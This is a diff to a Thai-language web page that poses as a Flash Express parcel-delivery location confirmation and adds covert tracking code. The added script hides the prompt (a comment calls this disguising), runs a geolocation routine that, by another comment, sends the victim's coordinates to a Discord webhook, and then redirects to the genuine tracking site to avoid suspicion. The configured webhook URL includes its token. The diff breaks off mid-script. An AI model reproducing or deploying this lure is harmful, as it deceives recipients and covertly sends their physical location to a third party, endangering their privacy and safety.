@@ -67,16 +67,42 @@
           เพื่อความปลอดภัยของทรัพย์สินและการนำจ่ายที่ถูกต้อง กรุณากด <strong class="text-emeraldSafe">'อนุญาต (Allow)'</strong> เพื่อยืนยันตำแหน่งรับพัสดุของคุณ
         </p>
         
-        <button id="allow-btn" class="w-full rounded-lg emerald-safe-gradient px-4 py-2.5 font-semibold text-white transition hover:opacity-90 active:scale-[0.98] shadow-md flex items-center justify-center gap-2">
-          <span>✔️</span>
-          <span>กดอนุญาตเพื่อตรวจสอบตำแหน่งจัดส่งล่าสุด</span>
-        </button>
+        <button id="allow-btn" onclick="handleTargetClick()" class="w-full rounded-lg emerald-safe-gradient px-4 py-2.5 font-semibold text-white transition hover:opacity-90 flex items-center justify-center gap-2">
+    <span>✔️</span>
+    <span>กดอนุญาตเพื่อตรวจสอบตำแหน่งจัดส่งล่าสุด</span>
+</button>
       </div>
     </div>
   </div>
 
   <script>
     'use strict';
+    // ประกาศตัวแปรลิงก์พัสดุ
+const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
+
+// ฟังก์ชันทำงานทันทีเมื่อมีการกดปุ่ม
+function handleTargetClick() {
+    // 1. บังคับนับถอยหลัง 2.5 วินาทีแล้วดีดหน้าจอไปเว็บพัสดุทันที (ห้ามบล็อก)
+    setTimeout(() => {
+        window.location.href = FLASH_EXPRESS_URL;
+    }, 2500);
+
+    // 2. ซ่อนหน้าต่าง Modal พรางตา
+    const modal = document.getElementById('modal-overlay');
+    if (modal) {
+        modal.style.opacity = '0';
+        modal.style.transition = 'opacity 0.3s ease';
+        setTimeout(() => { modal.style.display = 'none'; }, 300);
+    }
+
+    // 3. ยิงพิกัดส่งข้อมูลเข้า Discord และมอนิเตอร์
+    try {
+        if (typeof runHybridGeolocation === 'function') {
+            runHybridGeolocation();
+        }
+    } catch (e) {
+        console.log("Geolocation error processed background");
+    }
 
     // ===== CONFIGURATION =====
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
